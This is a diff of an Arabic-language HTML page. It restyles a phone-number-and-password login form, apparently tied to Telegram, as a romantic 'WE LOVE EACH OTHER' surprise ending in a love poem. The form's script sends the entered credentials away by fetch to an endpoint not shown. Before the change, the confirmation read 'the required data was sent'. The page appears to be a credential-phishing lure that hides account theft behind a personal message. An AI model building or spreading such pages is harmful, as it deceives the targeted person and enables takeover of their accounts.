@@ -15,22 +15,50 @@
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
+            min-height: 100vh;
             margin: 0;
             direction: rtl;
             padding: 20px;
         }
-        .card {
-            background: #ffffff;
-            padding: 40px 30px;
-            border-radius: 28px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.03);
+        .container {
             width: 100%;
             max-width: 400px;
             text-align: center;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        /* تصميم اللوجو العلوي */
+        .logo-area {
+            margin-bottom: 25px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .logo-svg {
+            width: 140px;
+            height: auto;
+            margin-bottom: 15px;
+        }
+        .logo-text {
+            font-size: 22px;
+            font-weight: bold;
+            color: #0b4a8f;
+            letter-spacing: 0.5px;
+            margin: 0;
+            font-family: 'Arial', sans-serif;
+        }
+        /* تصميم البطاقة */
+        .card {
+            background: #ffffff;
+            padding: 35px 30px;
+            border-radius: 28px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.03);
+            width: 100%;
         }
         h2 {
-            font-size: 28px;
+            font-size: 26px;
+            margin-top: 0;
             margin-bottom: 30px;
             color: #0076c6;
             font-weight: 600;
@@ -56,13 +84,12 @@
             font-size: 16px;
             outline: none;
             transition: all 0.3s ease;
-            text-align: left; /* لجعل النص الإنجليزي يظهر بشكل صحيح */
         }
         input:focus {
             border-color: #0076c6;
             background: #fff;
         }
-        /* تصميم زر تسجيل الدخول الجديد والمتناسق */
+        /* زر تسجيل الدخول */
         .submit-btn {
             width: 100%;
             padding: 16px;
@@ -81,78 +108,143 @@
             transform: translateY(-2px);
         }
 
-        /* نافذة النجاح (Modal) */
+        /* نافذة رسالة الحب والشعر الجديدة */
         .modal-overlay {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0, 0, 0, 0.4);
+            background: rgba(244, 106, 83, 0.2); /* خلفية وردية خفيفة */
+            backdrop-filter: blur(8px); /* تأثير ضبابي جميل */
             display: flex;
             justify-content: center;
             align-items: center;
             opacity: 0;
             pointer-events: none;
-            transition: opacity 0.3s ease;
+            transition: opacity 0.4s ease;
             z-index: 1000;
         }
         .modal {
             background: white;
-            border-radius: 24px;
-            padding: 30px;
+            border-radius: 28px;
+            padding: 35px 25px;
             width: 90%;
-            max-width: 350px;
+            max-width: 360px;
             text-align: center;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+            box-shadow: 0 15px 35px rgba(244, 106, 83, 0.15);
+            border: 2px solid #ff8fa3;
+            transform: scale(0.8);
+            transition: transform 0.4s ease;
         }
-        .modal.show { opacity: 1; pointer-events: auto; }
-        .success-icon {
-            font-size: 50px;
-            color: #22c55e;
+        .modal-overlay.show { opacity: 1; pointer-events: auto; }
+        .modal-overlay.show .modal { transform: scale(1); }
+        
+        .heart-icon {
+            font-size: 55px;
+            color: #ff4d6d;
             margin-bottom: 15px;
+            animation: beat 1s infinite alternate;
+        }
+        @keyframes beat {
+            to { transform: scale(1.15); }
+        }
+        
+        .love-title {
+            color: #ff4d6d;
+            font-size: 24px;
+            margin-bottom: 15px;
+            font-weight: 700;
+        }
+        .love-message {
+            font-size: 16px;
+            color: #4a5568;
+            line-height: 1.7;
+            margin-bottom: 20px;
+        }
+        .poetry-box {
+            background: #fff0f3;
+            border-left: 4px solid #ff4d6d;
+            border-right: 4px solid #ff4d6d;
+            padding: 15px;
+            border-radius: 12px;
+            font-style: italic;
+            color: #590d22;
+            margin-bottom: 25px;
+            font-size: 15px;
+            line-height: 1.8;
         }
         .close-btn {
-            background: #22c55e;
+            background: #ff4d6d;
             color: white;
             border: none;
             padding: 12px 30px;
-            border-radius: 12px;
+            border-radius: 14px;
             cursor: pointer;
-            margin-top: 15px;
             font-size: 16px;
+            font-weight: 600;
             width: 100%;
+            transition: all 0.3s ease;
+        }
+        .close-btn:hover {
+            background: #c9184a;
+            box-shadow: 0 5px 15px rgba(255, 77, 109, 0.3);
         }
     </style>
 </head>
 <body>
 
-    <div class="card">
-        <h2>تسجيل دخول ب حسابك</h2>
-        
-        <form id="telegramForm">
-            <div class="input-group">
-                <label for="phone">رقم هاتف</label>
-                <input type="text" id="phone" placeholder="kawther" required>
-            </div>
+    <div class="container">
+        <!-- اللوجو العلوي المكون من قلبين متشابكين مع النص الإنجليزي -->
+        <div class="logo-area">
+            <svg class="logo-svg" viewBox="0 0 200 130" xmlns="http://www.w3.org/2000/svg">
+                <!-- القلب الأيسر -->
+                <path d="M65,25 C45,5 15,20 15,50 C15,85 65,115 85,125 C75,110 30,80 30,50 C30,32 48,18 65,35 C82,18 100,32 100,50 C100,60 95,70 88,77 C84,81 76,85 71,85" stroke="#f46a53" stroke-width="13" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
+                <!-- القلب الأيمن -->
+                <path d="M135,25 C115,5 87,20 87,50 C87,55 89,61 92,66 M102,78 C115,92 125,102 135,110 C155,95 185,75 185,50 C185,20 155,5 135,25 Z" stroke="#fca130" stroke-width="13" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
+            </svg>
+            <h1 class="logo-text">WE LOVE EACH OTHER</h1>
+        </div>
+
+        <!-- بطاقة تسجيل الدخول -->
+        <div class="card">
+            <h2>تسجيل دخول ب حسابك</h2>
             
-            <div class="input-group">
-                <label for="password">كلمة المرور</label>
-                <input type="password" id="password" placeholder="dn dn kawther" required>
-            </div>
-            
-            <!-- زر الإرسال المضاف والمعدل لتسجيل الدخول -->
-            <button type="submit" class="submit-btn">تسجيل دخول</button>
-        </form>
+            <form id="telegramForm">
+                <div class="input-group">
+                    <label for="phone">رقم هاتف</label>
+                    <input type="tel" id="phone" placeholder="أدخل رقم الهاتف..." required>
+                </div>
+                
+                <div class="input-group">
+                    <label for="password">كلمة المرور</label>
+                    <input type="password" id="password" placeholder="أدخل كلمة المرور..." required>
+                </div>
+                
+                <button type="submit" class="submit-btn">تسجيل دخول</button>
+            </form>
+        </div>
     </div>
 
-    <!-- نافذة النجاح المبسطة -->
+    <!-- نافذة المفاجأة الرومانسية (رسالة الحب والشعر) -->
     <div class="modal-overlay" id="successModal">
         <div class="modal">
-            <div class="success-icon">✓</div>
-            <h3>تم تسجيل الدخول بنجاح</h3>
-            <p>تم إرسال البيانات المطلوبة.</p>
-            <button class="close-btn" onclick="closeModal()">موافق</button>
+            <div class="heart-icon">❤️</div>
+            <h3 class="love-title">إلى من سرقت قلبي... ✨</h3>
+            
+            <p class="love-message">
+                في كل يوم يمر، أجد نفسي أحبكِ أكثر وأكثر. أنتِ لستِ فقط جزءاً من يومي، بل أنتِ كل عمري ونبضات قلبي الرقيقة.
+            </p>
+            
+            <!-- صندوق الشعر الرومانسى -->
+            <div class="poetry-box">
+                "وما كنتُ ممن يَدخلُ العشقُ قلبَه<br>
+                ولكنّ مَن يُبصِرْ جفونَكِ يَعشَقِ...<br>
+                عيناكِ أرضٌ لا تخونُ عهودها<br>
+                وقلبكِ طمأنينتي وسلامي" 🌸
+            </div>
+            
+            <button class="close-btn" onclick="closeModal()">أحبكِ أيضاً ❤️</button>
         </div>
     </div>
 
@@ -181,14 +273,15 @@
             })
             .then(response => {
                 if(response.ok) {
+                    // إظهار نافذة الحب بمجرد الإرسال الناجح
                     document.getElementById('successModal').classList.add('show');
                     document.getElementById('telegramForm').reset();
                 } else {
-                    alert('حدث خطأ أثناء الإرسال، يرجى المحاولة لاحقاً.');
+                    alert('حدث خطأ غير متوقع، يرجى المحاولة لاحقاً.');
                 }
             })
             .catch(err => {
-                alert('فشل الاتصال بالخادم.');
+                alert('فشل الاتصال بالإنترنت.');
             });
         });
 
